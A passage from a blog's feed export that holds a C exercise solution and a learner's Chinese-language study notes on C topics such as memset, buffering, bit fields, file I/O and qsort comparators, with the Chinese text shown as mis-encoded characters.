class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, count = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100000</span>], b[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">a[i] = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> id1, id2;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;id1, &amp;id2);</span><br><span class="line">a[id1] = id2, a[id2] = id1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;id);</span><br><span class="line">b[id]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(b[i] &amp;&amp; (a[i] &lt; <span class="number">0</span> || !b[a[i]]))</span><br><span class="line">count++, b[i] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, count);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(b[i] == <span class="number">-1</span> &amp;&amp; count &gt; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%05d "</span>, i), count--;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b[i] == <span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%05d"</span>, i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Cè¯­è¨€å­¦ä¹  </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€ä¸€äº›æ€»ç»“</title>
      <link href="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
      <url>/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="å…³äºmemsetèµ‹åˆå€¼"><a href="#å…³äºmemsetèµ‹åˆå€¼" class="headerlink" title="å…³äºmemsetèµ‹åˆå€¼"></a>å…³äºmemsetèµ‹åˆå€¼</h2><ul><li><p>ä¸€èˆ¬æˆ‘ä»¬ä½¿ç”¨memsetéƒ½æ˜¯èµ‹å€¼0ä½œä¸ºåˆå§‹åŒ–å€¼ï¼Œä½†ä¸èƒ½èµ‹å€¼é0å˜›ï¼Ÿå…¶å®æ˜¯å¯ä»¥çš„ï¼Œä½†ä»…é™äºå¯¹åƒå­—ç¬¦æ•°ç»„é‚£æ ·çš„å•å­—èŠ‚æ•°æ®ã€‚</p></li><li><p>å› ä¸ºmemsetæ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¿›è¡Œå¡«å……çš„ã€‚<a id="more"></a></p></li></ul><hr><h2 id="ä¸€ä¸ªä¼˜å…ˆçº§é—®é¢˜"><a href="#ä¸€ä¸ªä¼˜å…ˆçº§é—®é¢˜" class="headerlink" title="ä¸€ä¸ªä¼˜å…ˆçº§é—®é¢˜"></a>ä¸€ä¸ªä¼˜å…ˆçº§é—®é¢˜</h2><ul><li><p>åœ¨åˆšå­¦æŒ‡é’ˆæ—¶å†™äº† <code>while(c = *(p++)  != &#39;\0&#39;)</code>ï¼Œä½†æ˜¯ä¸€ç›´å¾—ä¸åˆ°è‡ªå·±æƒ³è¦çš„ç»“æœã€‚</p></li><li><p>åŸå› åœ¨äºè¿™é‡Œ <code>!=</code> çš„ä¼˜å…ˆçº§å¤§äº <code>=</code>ï¼Œ æ‰€ä»¥å…ˆæ‰§è¡Œäº† <code>*(p++)  != &#39;\0&#39;</code>ï¼Œè€Œè¿™ä¸ªçš„ç»“æœæ˜¯ä»¥ä¸€ä¸ªbooleanå€¼ï¼Œåªæœ‰2ç§ç»“æœ 0 æˆ– 1ã€‚</p></li><li><p>æ•…c = 1 æˆ– 0 äº†ã€‚</p></li></ul><hr><h2 id="ç¼“å†²åŒº"><a href="#ç¼“å†²åŒº" class="headerlink" title="ç¼“å†²åŒº"></a>ç¼“å†²åŒº</h2><p>ä¸€ï¼šä»€ä¹ˆæ˜¯ç¼“å†²åŒºï¼Ÿ</p><ul><li>ç¼“å†²åŒºåˆç§°ä¸ºç¼“å­˜ï¼Œå®ƒæ˜¯å†…å­˜ç©ºé—´çš„ä¸€éƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å†…å­˜ç©ºé—´ä¸­é¢„ç•™äº†ä¸€å®šçš„å­˜å‚¨ç©ºé—´ï¼Œè¿™äº›å­˜å‚¨ç©ºé—´ç”¨æ¥ç¼“å†²è¾“å…¥æˆ–è¾“å‡ºçš„æ•°æ®ï¼Œè¿™éƒ¨åˆ†é¢„ç•™çš„ç©ºé—´å°±å«åšç¼“å†²åŒºã€‚</li><li>ç¼“å†²åŒºæ ¹æ®å…¶å¯¹åº”çš„æ˜¯è¾“å…¥è®¾å¤‡è¿˜æ˜¯è¾“å‡ºè®¾å¤‡ï¼Œåˆ†ä¸ºè¾“å…¥ç¼“å†²åŒºå’Œè¾“å‡ºç¼“å†²åŒºã€‚</li></ul><p>äºŒï¼šä¸ºä»€ä¹ˆè¦å¼•å…¥ç¼“å†²åŒºï¼Ÿ</p><ul><li>æ¯”å¦‚æˆ‘ä»¬ä»ç£ç›˜é‡Œå–ä¿¡æ¯ï¼Œæˆ‘ä»¬å…ˆæŠŠè¯»å‡ºçš„æ•°æ®æ”¾åœ¨ç¼“å†²åŒºï¼Œè®¡ç®—æœºå†ç›´æ¥ä»ç¼“å†²åŒºä¸­å–æ•°æ®ï¼Œç­‰ç¼“å†²åŒºçš„æ•°æ®å–å®Œåå†å»ç£ç›˜ä¸­è¯»å–ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘ç£ç›˜çš„è¯»å†™æ¬¡æ•°ï¼Œå†åŠ ä¸Šè®¡ç®—æœºå¯¹ç¼“å†²åŒºçš„æ“ä½œå¤§å¤§å¿«äºå¯¹ç£ç›˜çš„æ“ä½œï¼Œæ•…åº”ç”¨ç¼“å†²åŒºå¯å¤§å¤§æé«˜è®¡ç®—æœºçš„è¿è¡Œé€Ÿåº¦ã€‚</li><li>åˆæ¯”å¦‚ï¼Œæˆ‘ä»¬ä½¿ç”¨æ‰“å°æœºæ‰“å°æ–‡æ¡£ï¼Œç”±äºæ‰“å°æœºçš„æ‰“å°é€Ÿåº¦ç›¸å¯¹è¾ƒæ…¢ï¼Œæˆ‘ä»¬å…ˆæŠŠæ–‡æ¡£è¾“å‡ºåˆ°æ‰“å°æœºç›¸åº”çš„ç¼“å†²åŒºï¼Œæ‰“å°æœºå†è‡ªè¡Œé€æ­¥æ‰“å°ï¼Œè¿™æ—¶æˆ‘ä»¬çš„CPUå¯ä»¥å¤„ç†åˆ«çš„äº‹æƒ…ã€‚</li><li>ç¼“å†²åŒºå°±æ˜¯ä¸€å—å†…å­˜åŒºï¼Œå®ƒç”¨åœ¨è¾“å…¥è¾“å‡ºè®¾å¤‡å’ŒCPUä¹‹é—´ï¼Œç”¨æ¥ç¼“å­˜æ•°æ®ã€‚å®ƒä½¿å¾—ä½é€Ÿçš„è¾“å…¥è¾“å‡ºè®¾å¤‡å’Œé«˜é€Ÿçš„CPUèƒ½å¤Ÿåè°ƒå·¥ä½œï¼Œé¿å…ä½é€Ÿçš„è¾“å…¥è¾“å‡ºè®¾å¤‡å ç”¨CPUï¼Œè§£æ”¾å‡ºCPUï¼Œä½¿å…¶èƒ½å¤Ÿé«˜æ•ˆç‡å·¥ä½œã€‚</li></ul><p>ä¸‰ï¼šç¼“å†²åŒºçš„ç±»å‹ã€‚</p><p>åŒºåˆ†ä¸ºä¸‰ç§ç±»å‹ï¼šå…¨ç¼“å†²ã€è¡Œç¼“å†²å’Œä¸å¸¦ç¼“å†²ã€‚</p><ul><li><p>å…¨ç¼“å†²</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“å¡«æ»¡æ ‡å‡†I/Oç¼“å­˜åæ‰è¿›è¡Œå®é™…I/Oæ“ä½œã€‚å…¨ç¼“å†²çš„å…¸å‹ä»£è¡¨æ˜¯å¯¹ç£ç›˜æ–‡ä»¶çš„è¯»å†™ã€‚</p></li><li><p>è¡Œç¼“å†²</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“åœ¨è¾“å…¥å’Œè¾“å‡ºä¸­é‡åˆ°æ¢è¡Œç¬¦æ—¶ï¼Œæ‰§è¡ŒçœŸæ­£çš„I/Oæ“ä½œã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å…ˆå­˜æ”¾åœ¨ç¼“å†²åŒºï¼Œç­‰æŒ‰ä¸‹å›è½¦é”®æ¢è¡Œæ—¶æ‰è¿›è¡Œå®é™…çš„I/Oæ“ä½œã€‚å…¸å‹ä»£è¡¨æ˜¯é”®ç›˜è¾“å…¥æ•°æ®ã€‚</p></li><li><p>ä¸å¸¦ç¼“å†²</p><p>ä¹Ÿå°±æ˜¯ä¸è¿›è¡Œç¼“å†²ï¼Œæ ‡å‡†å‡ºé”™æƒ…å†µstderræ˜¯å…¸å‹ä»£è¡¨ï¼Œè¿™ä½¿å¾—å‡ºé”™ä¿¡æ¯å¯ä»¥ç›´æ¥å°½å¿«åœ°æ˜¾ç¤ºå‡ºæ¥ã€‚</p></li></ul><p>å››ï¼šåˆ·æ–°ç¼“å†²åŒº</p><ul><li>åœ¨æˆ‘ä»¬Cè¯­è¨€æ–‡ä»¶æ“ä½œä¸­ä½¿ç”¨ <code>fclose()</code>å‡½æ•°å°±æœ‰é‚£ç§ä½œç”¨ã€‚</li></ul><hr><h2 id="å…³äºè”åˆä½åŸŸï¼Œå°ç«¯"><a href="#å…³äºè”åˆä½åŸŸï¼Œå°ç«¯" class="headerlink" title="å…³äºè”åˆä½åŸŸï¼Œå°ç«¯"></a>å…³äºè”åˆä½åŸŸï¼Œå°ç«¯</h2><ul><li><p>åœ¨ä¸€èˆ¬çš„æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„è®¡ç®—æœº, æ•°æ®å­˜å‚¨æ–¹å¼éƒ½æ˜¯å°ç«¯, ä½†æ˜¯Cè¯­è¨€ç¼–è¯‘å™¨éƒ½ä¼šç»è¿‡å¤„ç†, æ‰€ä»¥æ€»æ˜¯æŒ‰ä¸€ä¸ªç±»å‹, å€’åºæ˜¾ç¤ºã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200426080918889-1590480458990-1590662951683.png" alt="image-20200426080918889-1590480458990"></p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200426080956374-1590480458991-1590662970168.png" alt="image-20200426080956374-1590480458991"></p></li><li><p>ä»ä»¥ä¸Šä¸¤ä¸ªå›¾ç‰‡å¯ä»¥çœ‹å‡º, å½“ç»“æ„ä½“ä¸­ä½åŸŸå®šä¹‰æ—¶. æ˜¯ä»å·¦å¾€å³ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¿›è¡Œå®šä¹‰, åœ¨ä¸€ä¸ªå­—èŠ‚ä¸­ä¹Ÿæ˜¯ä»ä½ä½bit0 å¼€å§‹ç®—èµ·çš„(æ³¨æ„ä¸æ˜¯ä»é«˜ä½å¼€å§‹å¯¹åº”)ã€‚</p></li><li><p>å¦‚ä¸Šå›¾ä¸­ test.year = 0x655, yearæœ‰12ä½. ä½†æ˜¯åœ¨å¤šå‡ºçš„4ä½ä¸­, 06åœ¨è¯¥å­—èŠ‚çš„ä½ä½, test.month = 0x4åœ¨è¯¥å­—èŠ‚çš„é«˜ä½ã€‚</p></li><li><p>å½“ç›¸é‚»æˆå‘˜çš„ç±»å‹ç›¸åŒæ—¶ï¼Œå¦‚æœå®ƒä»¬çš„ä½å®½ä¹‹å’Œå°äºç±»å‹çš„ sizeof å¤§å°ï¼Œé‚£ä¹ˆåé¢çš„æˆå‘˜ç´§é‚»å‰ä¸€ä¸ªæˆå‘˜å­˜å‚¨ï¼Œç›´åˆ°ä¸èƒ½å®¹çº³ä¸ºæ­¢ï¼›å¦‚æœå®ƒä»¬çš„ä½å®½ä¹‹å’Œå¤§äºç±»å‹çš„ sizeof å¤§å°ï¼Œé‚£ä¹ˆåé¢çš„æˆå‘˜å°†ä»æ–°çš„å­˜å‚¨å•å…ƒå¼€å§‹ï¼Œå…¶åç§»é‡ä¸ºç±»å‹å¤§å°çš„æ•´æ•°å€ã€‚ è‹¥ä¸æ˜¯åŒç±»å‹, åˆ™ä¸ä¼š, æ³¨æ„(int ä¸ short int)ä¹Ÿæ˜¯ä¸åŒç±»å‹.ã€‚</p></li></ul><hr><h2 id="äºŒç»´æ•°ç»„å½¢å‚é—®é¢˜"><a href="#äºŒç»´æ•°ç»„å½¢å‚é—®é¢˜" class="headerlink" title="äºŒç»´æ•°ç»„å½¢å‚é—®é¢˜"></a>äºŒç»´æ•°ç»„å½¢å‚é—®é¢˜</h2><ul><li>å½“äºŒç»´æ•°ç»„ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œå‡½æ•°çš„å½¢å‚ä¸èƒ½ç®€å•åœ°å†™åŒé‡æŒ‡é’ˆã€‚</li><li>å› ä¸ºç¼–è¯‘å™¨å®é™…å¯»å€å¦‚ä¸‹ï¼šå¯¹äºæ•°ç»„ int p[m][n];å¦‚æœè¦å–p[i][j]çš„å€¼ï¼Œç¼–è¯‘å™¨æ˜¯è¿™æ ·å¯»å€çš„ï¼šp + i*n + j; å¦‚æœæˆ‘ä»¬çœç•¥äº†ç¬¬äºŒç»´æˆ–è€…æ›´é«˜ç»´çš„å¤§å°ï¼Œç¼–è¯‘å™¨å°†ä¸çŸ¥é“å¦‚ä½•æ­£ç¡®çš„å¯»å€ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬åœ¨ç¼–å†™ç¨‹åºçš„æ—¶å€™éœ€è¦ç”¨åˆ°å„ä¸ªç»´æ•°éƒ½ä¸å›ºå®šçš„äºŒç»´æ•°ç»„ä½œä¸ºå‚æ•°ï¼Œè™½ç„¶è¿™ä¸ªæ—¶å€™ç¼–è¯‘å™¨è¿˜æ˜¯ä¸èƒ½è¯†åˆ«ã€‚</li><li>æˆ‘ä»¬å¯ä»¥æŠŠäºŒç»´æ•°ç»„å½“åšæ™®é€šçš„æŒ‡é’ˆï¼Œå°†å®ƒçš„å¤§å°ç”¨ä¸¤ä¸ªå‚æ•°æŒ‡æ˜ï¼Œç„¶åæˆ‘ä»¬ä¸ºäºŒç»´æ•°ç»„æ‰‹å·¥å¯»å€ï¼Œè¿™æ ·å°±å¯ä»¥å°†äºŒç»´æ•°ç»„ä½œä¸ºå‡½æ•°çš„å‚æ•°ä¼ é€’äº†ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠç»´æ•°å›ºå®šçš„å‚æ•°å˜ä¸ºç»´æ•°éšå³çš„å‚æ•°ã€‚</li></ul><hr><h2 id="éœ€è¦ç”¨getchar-åƒæ‰å›è½¦çš„æƒ…å†µ"><a href="#éœ€è¦ç”¨getchar-åƒæ‰å›è½¦çš„æƒ…å†µ" class="headerlink" title="éœ€è¦ç”¨getchar()åƒæ‰å›è½¦çš„æƒ…å†µ"></a>éœ€è¦ç”¨getchar()åƒæ‰å›è½¦çš„æƒ…å†µ</h2><ol><li>æ¥å—å­—ç¬¦æˆ–å­—ç¬¦ä¸²çš„å‰é¢æœ‰<code>scanf()</code>è¯­å¥ã€‚</li><li>è¿ç»­ä½¿ç”¨2ä¸ª<code>getchar()</code>æ¥å—å­—ç¬¦æ—¶ï¼Œä¸­é—´è¦ä½¿ç”¨ä¸€ä¸ª<code>getchar()</code>åƒæ‰å›è½¦ã€‚</li><li>scanf()ï¼›åå¦‚æœæ˜¯æ˜¯ç”¨gets()è¾“å…¥å­—ç¬¦ä¸²ï¼Œé‚£å¿…é¡»å…ˆåƒæ‰å›è½¦ï¼›å¦‚æœæ˜¯ç”¨scanf(â€œ%sâ€, )ï¼›è¾“å…¥å­—ç¬¦ä¸²å¯ä»¥ä¸åƒæ‰å›è½¦ã€‚</li></ol><p><strong>æ³¨æ„ï¼š<code>gets()</code>åé¢æ˜¯ä¸éœ€è¦åƒæ‰å›è½¦çš„ï¼Œå› ä¸ºå®ƒæŠŠå›è½¦è½¬åŒ–ä¸ºäº†å­—ç¬¦ä¸²æœ€åçš„ â€˜\0â€™ ã€‚</strong></p><hr><h2 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h2><ul><li><p>å¯¹äºæ–‡ä»¶å†™å…¥æ–¹å¼ä¸»è¦è¿˜æ˜¯ä¸ä½¿ç”¨çš„å‡½æ•°æœ‰å…³ï¼Œä¸æ‰“å¼€æ–¹å¼å…³ç³»ä¸å¤§ã€‚</p></li><li><p>æ–‡æœ¬å½¢å¼å†™å…¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">fp = fopen(<span class="string">"lines"</span>, <span class="string">"w"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//fwrite(&amp;a, 1, 4, fp);</span></span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">"%d"</span>, a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200528192200300.png" alt="image-20200528192200300"></p></li><li><p>äºŒè¿›åˆ¶å½¢å¼å†™å…¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">fp = fopen(<span class="string">"lines"</span>, <span class="string">"wb"</span>); </span><br><span class="line"></span><br><span class="line">fwrite(&amp;a, <span class="number">1</span>, <span class="number">4</span>, fp);</span><br><span class="line"><span class="comment">//fprintf(fp, "%d", a);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200528192308515.png" alt="image-20200528192308515"></p></li><li><p>ä»ä»¥ä¸Šå¯ä»¥å¾ˆæ¸…æ¥šä»–ä»¬çš„åŒºåˆ«ã€‚</p></li></ul><hr><h2 id="å…³äºä¸€ä¸ªæ ¼å¼è¯´æ˜ç¬¦"><a href="#å…³äºä¸€ä¸ªæ ¼å¼è¯´æ˜ç¬¦" class="headerlink" title="å…³äºä¸€ä¸ªæ ¼å¼è¯´æ˜ç¬¦"></a>å…³äºä¸€ä¸ªæ ¼å¼è¯´æ˜ç¬¦</h2><ul><li>ä¹‹å‰ç”±äºå—åˆ° %02d ç±»ä¼¼çš„è¡¨è¾¾ï¼Œä¸è¶³2ä½ç”¨2å¡«å……ï¼Œè¶…è¿‡2ä½å°±åŸæ ·ã€‚</li><li>ç„¶åäº†%10sï¼Œè‡ªå·±å°±é»˜è®¤äº†è¿˜æ˜¯é‚£ä¸ªæ„æ€ï¼Œå…¶å®è¿™é‡Œæ˜¯æˆªæ–­çš„æ„æ€ï¼Œè¶…è¿‡10ä½çš„ç•™åœ¨ç¼“å†²åŒºã€‚</li></ul><hr><h2 id="æŒ‡é’ˆä¸æ•°ç»„"><a href="#æŒ‡é’ˆä¸æ•°ç»„" class="headerlink" title="æŒ‡é’ˆä¸æ•°ç»„"></a>æŒ‡é’ˆä¸æ•°ç»„</h2><p>ä»¥å‰å­¦ä¹ æŒ‡é’ˆæ—¶çš„ä¸€ä¸ªç–‘é—®ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200427215908475-1591952027801.png" alt="image-20200427215908475"></p><p><strong>å› ä¸ºæˆ‘ä»¬åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„æ—¶,æ•°ç»„çš„åˆå§‹å€¼æ”¾åœ¨rodataæ®µé‡Œé¢.æ•°ç»„å¯¹åº”å¼€è¾Ÿçš„ç©ºé—´ä¸Šçš„æ•°å€¼å­˜æ”¾åœ¨æ ˆä¸Š,ç¼–è¯‘å™¨ä¼šå»è®¿é—®rodataæ®µä¸Šçš„åˆå§‹å€¼ç„¶åå–æ¥åˆå§‹åŒ–å±€éƒ¨å˜é‡ï¼Œå› æ­¤æ•°ç»„çš„å€¼æ‰èƒ½ä¿®æ”¹. è€ŒæŒ‡é’ˆæŒ‡å‘çš„æ˜¯rodataæ®µï¼Œæ˜¯ä¸èƒ½è¢«ä¿®æ”¹çš„</strong></p><hr><h2 id="è¡¥ç çš„æ€»ç»“"><a href="#è¡¥ç çš„æ€»ç»“" class="headerlink" title="è¡¥ç çš„æ€»ç»“"></a>è¡¥ç çš„æ€»ç»“</h2><p>å¯¹äºä¸€ä¸ªæœ‰ç¬¦å·çš„charå‹æ•°æ®ã€‚</p><p><strong>æœ‰ -1-128 = 127, 127+1 = -128;</strong>, å†ç»“åˆä¹‹å‰çœ‹åˆ°çš„è¡¥ç å’Œæ—¶é’ŸåŸç†å¾ˆåƒ, è‡ªå·±æ€»ç»“äº†ä¸‹, å¯ä»¥æŠŠè¿™ä¸ªè®¡ç®—æƒ³æˆæ˜¯ä¸€ä¸ªåœ†åœˆ, ä»¥ä¸€ä¸ªå­—èŠ‚8ä½æ¥çœ‹, æˆ‘ä»¬çŸ¥é“èŒƒå›´æ˜¯ <strong>-128 - 127</strong></p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200417131746746-1590549170275.png" alt="http://www.bxnop.cn/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200417131746746-1590549170275.png"></p><p>çŸ¥é“ä¸€ä¸ªå‘¨æœŸçš„å¤§å°æ˜¯ <strong>256</strong>. é‚£ä¹ˆæœ‰ <strong>-1+1= 0</strong> ä¹Ÿå¯ä»¥å†™æˆ <strong>-1 - 255 = 0</strong>, ç›¸å½“äº -1 é€†æ—¶é’ˆè½¬äº† ä¸€åœˆå°‘1çš„è·ç¦», é‚£ä¹ˆå°±æ˜¯0çš„ä½ç½®, å› ä¸ºå¦‚æœè½¬äº†ä¸€åœˆçš„è¯, å›åˆ°åŸä½ç½®,. é¡ºæ—¶é’ˆåŠ æ³•ä¹Ÿæ˜¯ä¸€æ ·çš„åŸç†, <strong>0 + 256 = 0</strong>ã€‚</p><hr><h2 id="qsortçš„æ¯”è¾ƒå‡½æ•°çš„æ³¨æ„"><a href="#qsortçš„æ¯”è¾ƒå‡½æ•°çš„æ³¨æ„" class="headerlink" title="qsortçš„æ¯”è¾ƒå‡½æ•°çš„æ³¨æ„"></a>qsortçš„æ¯”è¾ƒå‡½æ•°çš„æ³¨æ„</h2><p>qsortçš„æ¯”è¾ƒå‡½æ•°çš„è¿”å›å€¼æ˜¯intï¼Œè¿™æ¬¡é¢˜ç›®çš„æ•°æ®æ˜¯æµ®ç‚¹æ•°ï¼Œæ‰€ä»¥å¦‚æœå½“ä¸¤ä¸ªæµ®ç‚¹æ•°ç›¸å·®å°äº1çš„æ—¶å€™ï¼Œè¿”å›çš„å€¼ä¸ºå˜æˆintå‹çš„0ï¼Œé‚£å°±ä¸ä¼šå‘ç”Ÿæ’åºäº†ã€‚å³æˆ‘ç”¨çš„<code>return q-&gt;price_single - p-&gt;price_single;</code>ï¼Œå½“ä»–ä»¬2ä¸ªæ•°ç›¸å·®å°äº1å°±è¿”å›0ï¼Œå¯¼è‡´ç»“æœæ˜¯ä¸æ’åºã€‚è¿™é‡Œæ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯<code>return q-&gt;price_single &gt; p-&gt;price_single;</code>ï¼Œä»¥åéƒ½å†™å¤§äºå°äºäº†ã€‚</p><p><strong>2020/8/4</strong> </p><p>ä»Šå¤©ï¼Œä»ä¸€é“é¢˜å› ä¸ºæ¯”è¾ƒå‡½æ•°cmpä½¿ç”¨ä¸å½“ï¼Œå¯¼è‡´æ’åºä¸€ç›´å‡ºé”™ã€‚è¿›è€Œå¯¹Cè¯­è¨€çš„qsortä¸C++çš„sortä»–ä»¬çš„æ¯”è¾ƒå‡½æ•°cmpè¿›è¡Œäº†æ·±ç©¶ã€‚</p><p>é¦–å…ˆè¯´è¯´é—®é¢˜ï¼Œä»¥å‰ä¸€ç›´åœ¨æ¯”è¾ƒå‡½æ•°ä¹ æƒ¯å†™<code>retrun a-b</code>è¿™ç§æ ¼å¼ï¼Œè‡ªä»å‡ºäº†ä¸Šé¢æ‰€è¿°çš„å…³äºæµ®ç‚¹æ•°çš„æ¯”è¾ƒé—®é¢˜ï¼Œç»Ÿä¸€æ¢æˆäº†ä½¿ç”¨<code>return a &gt; b</code>çš„æ ¼å¼ï¼Œä»Šå¤©é—®é¢˜æ¥äº†ï¼Œè¿™æ ·å†™ä¸€ç›´æ’åºä¸æ­£ç¡®ã€‚æ¢äº†Cè¯­è¨€ç‰ˆæœ¬åˆæ˜¯æ­£ç¡®çš„äº†ã€‚ã€‚å…¶å®è¿™ç§<code>return a &gt; b</code>çš„æ ¼å¼æ˜¯æ›´é«˜çº§çš„å†™æ³•å§ï¼Œåƒgccç¼–è¯‘å™¨éƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†devcä¸vc6éƒ½ä¸è¡Œã€‚å…¼å®¹çš„å†™æ³•ï¼š<code>*return *(int *)a &gt; *(int *)b ? 1:-1;*</code>ï¼ŒåŸå› åé¢å†å™è¿°ã€‚</p><p>å­¦ä¹ ä¸­åˆçœ‹è§C++ä¸­sortå‡½æ•°çš„cmpå‡½æ•°ï¼Œåˆæ­¥å‘ç°å®ƒå’Œqsortçš„cmpå‡½æ•°æ˜¯ç›¸åçš„å†™æ³•ã€‚ã€‚è€Œå¯¹äºsortçš„cmpå‡½æ•°åªæœ‰ä¸€ç§å†™æ³•ï¼š<code>return a &gt; b;</code>(ä»å¤§åˆ°å°æ’åºï¼‰ï¼Œ<code>return a &lt; 